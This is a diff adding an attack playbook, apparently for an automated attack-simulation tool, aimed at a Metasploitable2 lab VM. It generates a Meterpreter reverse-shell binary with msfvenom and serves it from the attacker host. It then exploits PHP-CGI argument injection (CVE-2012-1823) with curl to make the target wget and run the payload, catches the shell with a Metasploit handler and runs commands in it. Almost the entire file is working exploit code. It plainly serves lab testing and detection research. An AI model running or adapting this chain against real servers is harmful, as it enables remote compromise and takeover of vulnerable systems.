@@ -1,0 +1,70 @@
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. Create a temporary file for the reverse-shell payload
+#     2. Generate the payload
+#     3. Serve the payload via webserv in background
+#     4. Exploit CVE-2012-1823 and inject a command to download the reverse shell
+#     5. Start a muli handler to listen for the reverse shell
+#     6. Exploit CVE-2012-1823 and inject a command to execute the reverse shell
+#     7. Run commands in the reverse shell
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Install curl
+#     4. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: 172.17.0.106
+  ATTACKER: 172.17.0.127
+  PAYLOAD: linux/x86/meterpreter/reverse_tcp
+  LPORT: 4444
+  CURL: 'curl -XPOST "http://172.17.0.106/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"'
+
+commands:
+  # create a temporary file for a reverse shell payload
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+
+  # generate reverse shell
+  - type: shell
+    cmd: ../metasploit-framework/msfvenom -p $PAYLOAD LHOST=$ATTACKER LPORT=$LPORT -f elf > ${RSHELL}
+
+  # serve the reverse shell via webserver in background mode
+  - type: webserv
+    local_path: $RSHELL
+    port: 8080
+    background: True
+
+  # Inject code that downloads the reverse shell from the webserver in background mode
+  - type: shell
+    cmd: "$CURL -d \"<?php system('wget -O /tmp/shell http://${ATTACKER}:8080/$RSHELL')?>\""
+
+  # Start a reverse shell listener in background
+  - type: msf-module
+    creates_session: shell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    background: true
+    kill_on_exit: true
+
+  # Execute the reverse shell
+  - type: shell
+    cmd: "$CURL -d \"<?php system('chmod +x /tmp/shell && /tmp/shell &')?>\""
+    background: true
+    kill_on_exit: true
+
+  # Run commands using the reverse shell
+  - type: msf-session
+    session: shell
+    cmd: sysinfo
+
+  - type: msf-session
+    session: shell
+    cmd: getuid
